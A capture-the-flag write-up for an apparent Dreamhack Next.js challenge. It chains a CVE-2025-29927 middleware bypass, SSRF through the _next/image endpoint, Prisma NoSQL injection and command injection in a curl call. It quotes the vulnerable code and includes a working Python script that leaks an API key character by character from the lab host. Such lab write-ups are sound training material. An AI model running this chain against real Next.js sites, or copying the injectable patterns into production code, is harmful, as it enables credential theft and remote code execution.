Link

Using Nessus to scan  for nextjs related CVE and i reveive CVE-2025-29927 

I use this cve to bypass middleware.ts file

preview code:

- command injection: This function is invoked via Next-action header.
    - required conditions:
        - api
        - bypass forbiden character : use array to bypass
        - next-action value
    
    ```bash
    export async function  doRequest() (
        key: string,
        id: number,
        path: string,
      ): Promise<string> {
        const api = await prisma.api.findFirst({ where: { id } })
        if (!api) return 'Invalid API'
        if (api?.key !== key) return 'Invalid API key'
        if (path.length > 10) return 'Path too long'
        if ([...'!@#$%^&*()-_=+[{]};:\'",<.>/?\\|'].some((c) => path.includes(c)))
          return 'Forbidden character'
    
        const { stdout } = await exec(`curl http://${api.host}/api/${path}`, {
          timeout: 1000,
        })
    
    ```
    
- NoSQL injection: this function is invoked via local request.
    
    ```bash
    export async function GET(req: NextRequest) {
      if (!(await validate()))
        return NextResponse.json(
          { error: 'Only admin or localhost is allowed' },
          { status: 403 },
        )
    
      const query = JSON.parse(req.nextUrl.searchParams.get('query') || '{}')
    
      const api = await prisma.api.findMany({
        where: query,
        select: { id: true, host: true },
        orderBy: { id: 'asc' },
      })
      if (api.length != 0) return NextResponse.json({ api }, { status: 200 })
      else return NextResponse.json({ error: 'No API found' }, { status: 404 })
    }
    
    ```
    
- In the nodejs have default endpoint `_next/image` to invoke image . Content of next.config.ts file can be missconfigured : it allow call image from localhost
    
    ```bash
    import type { NextConfig } from 'next'
    import { randomBytes } from 'crypto'
    
    const nextConfig: NextConfig = {
      experimental: {
        serverActions: {
          allowedOrigins: ['localhost'],
        },
      },
      images: {
        remotePatterns: [
          {
            hostname: 'localhost',
          },
        ],
      },
      compiler: {
        define: {
          BUILD_ID: randomBytes(16).toString('hex'),
        },
      },
      output: 'standalone',
    }
    
    export default nextConfig
    
    ```
    

Exploitation campaign:

- Using burp suite to modify the response , enabling FE button to leak next-action value
- leaveraging NoSQLi to leak API key
- using arrays to bypass the security filter

step by step:

- script leak api
    
    ```bash
    import requests
    import urllib.parse
    
    # Thay đổi URL của target cho phù hợp với môi trường của bạn
    TARGET = "http://host3.dreamhack.games:19355/"
    API_ID = 1  # ID của API bạn muốn leak key
    known_key = ""
    chars = "0123456789abcdef"  # Thường key được sinh bằng hex string (randomBytes)
    
    print("[*] Bắt đầu quá trình leak key qua Blind SSRF...")
    
    while True:
        found_char = False
        for c in chars:
            test_key = known_key + c
            
            # Xây dựng câu lệnh Prisma Injection dạng JSON
            query_json = f'{{"id": {API_ID}, "key": {{"startsWith": "{test_key}"}}}}'
            encoded_query = urllib.parse.quote(query_json)
            
            # Tạo URL SSRF qua _next/image
            target_url = f"{TARGET}/_next/image?w=256&q=1&url=http://localhost:3000/api/manage?query={encoded_query}"
            
            try:
                res = requests.get(target_url, timeout=5)
                
                # Phân tích Oracle: 
                # Nếu query đúng, /api/manage trả về 200 -> _next/image báo lỗi "valid image"
                # Nếu query sai, /api/manage trả về 404 -> _next/image trả về trạng thái/lỗi khác (ví dụ 404 hoặc không chứa chuỗi trên)
                if "valid image" in res.text or res.status_code == 500:
                    known_key = test_key
                    print(f"[+] Tìm thấy ký tự tiếp theo! Key hiện tại: {known_key}")
                    found_char = True
                    break
            except Exception as e:
                print(f"[-] Lỗi kết nối: {e}")
                
        if not found_char:
            print(f"\n[!] Đã leak xong Key hoàn chỉnh: {known_key}")
            break
    
    ```
    
- request to RCE to read a flag

!image.png